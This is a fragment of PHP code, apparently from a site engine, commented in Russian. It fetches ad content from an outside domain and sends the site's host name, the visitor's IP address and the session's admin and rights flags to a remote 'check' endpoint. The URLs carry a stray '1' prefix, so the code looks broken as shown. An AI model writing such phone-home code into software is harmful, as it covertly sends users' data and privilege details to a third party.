...
if(!$_SESSION['ad_block']) {
	$_SESSION['ad_block'] = file_get_contents('1http://bonvio.ru/control/ad/');
}
//Произведем сверку с сервером
if(!$_SESSION['check_ok']) {
	$_SESSION['check_ok'] = file_get_contents('1http://bonvio.ru/control/imhere/'.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REMOTE_ADDR'].'/'.$_SESSION['isadmin'].'/'.$_SESSION['status'].'/'.$_SESSION['rights']);
}
